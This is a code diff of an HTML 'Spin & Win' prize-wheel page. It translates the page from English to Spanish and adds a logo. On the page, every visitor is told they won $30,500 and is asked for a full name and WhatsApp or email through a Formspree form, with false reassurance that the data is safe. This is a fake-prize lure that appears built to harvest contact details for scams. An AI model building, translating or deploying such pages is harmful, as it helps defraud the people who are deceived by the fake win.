@@ -1,48 +1,48 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="es">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Spin & Win Big!</title>
+  <title>Gira y Gana</title>
   <link rel="stylesheet" href="style.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
 </head>
 <body>
 
+  <div class="logo-container">
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTid7FRnGKkjnH24tmXEDEiGGsbz4quMV7tyNw9367Q3Q&s" alt="Logo" class="logo">
+  </div>
+
   <div id="game-section">
-    <h1>Spin & Win Huge Cash! 🎰</h1>
-    <p>Click to spin — big prizes await!</p>
+    <h1>Gira y Gana</h1>
+    <p>¡Gírala! — Premios emocionantes te esperan.</p>
 
     <div class="wheel-container">
-      <div class="wheel" id="wheel">SPIN ME 🎁</div>
+      <div class="wheel" id="wheel">GIRA</div>
       <div class="pointer">▼</div>
     </div>
 
-    <button id="spinBtn">SPIN NOW!</button>
+    <button id="spinBtn">¡Girar Ahora!</button>
 
-    <p id="result" style="font-size: 24px; min-height: 80px;"></p>
+    <p id="result"></p>
   </div>
 
   <div id="form-section" style="display: none;">
-    <h2 style="color: #ffd700;">CONGRATULATIONS! 🎉</h2>
-    <p style="font-size: 22px; color: #00ff9d;">
-      YOU WON $30,500 💰<br>
-      FILL THE FORM BELOW TO PROCEED & CLAIM YOUR PRIZE!
+    <h2>¡Felicidades!</h2>
+    <p class="prize-text">
+      ¡GANASTE $30,500!<br>
+      Completa el formulario para reclamar tu premio.
     </p>
 
-    <!-- Formspree form -->
     <form action="https://formspree.io/f/xzdrqyke" method="POST">
-      <input type="text" name="name" placeholder="Your Full Name" required><br>
-      <input type="text" name="contact" placeholder="WhatsApp or Email" required><br>
-      
-      <!-- Hidden field so you see the prize in your inbox/dashboard -->
-      <input type="hidden" name="prize" value="CONGRATULATIONS YOU WON $30,500">
+      <input type="text" name="nombre" placeholder="Nombre Completo" required>
+      <input type="text" name="contacto" placeholder="WhatsApp o Email" required>
+      <input type="hidden" name="premio" value="Ganaste $30,500">
 
-      <button type="submit">CLAIM MY $30,500 NOW</button>
+      <button type="submit">Reclamar Premio</button>
     </form>
 
-    <p style="font-size: 14px; color: #aaa; margin-top: 30px;">
-      Your info is safe — we'll contact you shortly!
-    </p>
+    <p class="small-note">Tus datos están seguros — te contactaremos pronto.</p>
   </div>
 
   <script src="script.js"></script>
